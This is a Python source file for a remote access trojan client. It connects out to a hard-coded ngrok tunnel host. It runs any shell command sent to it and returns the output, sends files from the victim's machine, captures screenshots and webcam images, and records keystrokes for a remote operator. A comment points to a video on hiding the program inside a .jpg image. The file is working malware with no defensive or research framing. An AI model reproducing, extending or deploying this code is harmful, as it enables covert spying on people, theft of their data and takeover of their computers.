import socket
import threading
import subprocess
import os
import keyboard
import pyautogui
import cv2 as cv
import time

#   Hide inside .jpg    https://www.youtube.com/watch?v=jcLYtfNhAMQ 

HEADER = 64
PORT = 11819
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = '4.tcp.eu.ngrok.io'
ADDR = (SERVER, PORT)
keylogger_status = False
connected = True
sending_file = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def isConnected():
    global connected
    global sending_file
    try:
        while connected:
            if not sending_file:
                client.sendall(b' ')
                time.sleep(5)
    except:
        connected = False


def send(msg):
    global sending_file
    try:
        sending_file = True
        message = str(msg).encode(FORMAT, errors='ignore')
        msg_length = len(message)
        send_length = str(msg_length).encode(FORMAT)
        send_length += b' ' * (HEADER - len(send_length))
        client.send(send_length)
        client.send(message)
        sending_file = False
    except:
        pass

def sendFile(filename):
    global sending_file
    try:
        sending_file = True
        file = open(filename,'rb')
        file_size = os.path.getsize(filename)
        send('size: '+str(file_size))
        file_data = file.read(file_size)
        #send('!file')
        time.sleep(1)
        client.send(file_data)
        file.close()
        sending_file = False
    except:
        pass


def webcam():
    try:
        cam = cv.VideoCapture(0)
        result, image = cam.read()
        if result:
            cv.imwrite("Webcam.png", image)
            time.sleep(1)
            sendFile('Webcam.png')
            subprocess.run('del "Webcam.png"',shell=True,capture_output=True,text=True)
        pass
    except:
        pass



def recieve():
    global keylogger_status
    global connected
    try:
        while connected:
            msg_length = client.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length)
                msg = client.recv(msg_length).decode(FORMAT)

                if msg[:2]=='cd':
                    if 'cd' == msg:
                        send(os.getcwd())
                    else:
                        try:
                            os.chdir(msg[3:])
                        except:
                            pass
                        send(os.getcwd())
                        
                elif msg == "ipconfig":
                    data = subprocess.check_output("ipconfig",errors='ignore')
                    send(data)

                elif msg == "keylogger start":
                    keylogger_status = True
                    send("KEYLOGGER STATUS : TRUE") 

                elif msg == "keylogger stop":
                    keylogger_status = False
                    send("KEYLOGGER STATUS : FALSE")
                
                elif msg == 'screenshot':
                    myScreenshot = pyautogui.screenshot()
                    myScreenshot.save('Image.jpg')
                    sendFile('Image.jpg')
                    subprocess.run('del "Image.jpg"',shell=True,capture_output=True,text=True)
                
                elif msg == 'webcam':
                    webcam()
                
                elif msg[:8]== 'sendfile':
                    sendFile(msg[9:])
            
                elif msg == 'exit':
                    connected = False
                    break

                else:
                    data = subprocess.run(msg,shell=True,capture_output=True,text=True,errors='ignore')
                    send(data.stdout)
    except:
        pass

def keylog():
    while connected:
        try:
            if keylogger_status:
                key = keyboard.read_event()
                if str(key)[-5:-1] == 'down':
                    send('key: '+str(key)[14:-5])
        except:
            pass


incoming = threading.Thread(target=recieve,args=())
incoming.start()

keylogger = threading.Thread(target=keylog,args=())
keylogger.start()

status_check = threading.Thread(target=isConnected,args=())
status_check.start()



